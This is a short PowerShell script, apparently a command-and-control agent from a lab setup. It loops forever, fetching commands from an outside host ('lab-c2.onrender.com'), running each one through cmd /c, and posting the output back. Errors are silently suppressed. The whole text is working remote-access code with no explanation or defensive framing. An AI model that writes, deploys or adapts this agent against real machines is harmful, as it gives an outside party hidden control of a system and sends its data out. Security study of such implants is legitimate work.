$c2 = 'https://lab-c2.onrender.com'
while($true) {
    try {
        $r = (Invoke-WebRequest -Uri "$c2/getcmd" -UseBasicParsing).Content | ConvertFrom-Json
        if ($r.cmd) {
            $o = (cmd /c $r.cmd 2>&1) | Out-String
            Invoke-WebRequest -Uri "$c2/result" -Method POST -Body (ConvertTo-Json @{output=$o}) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 3
}
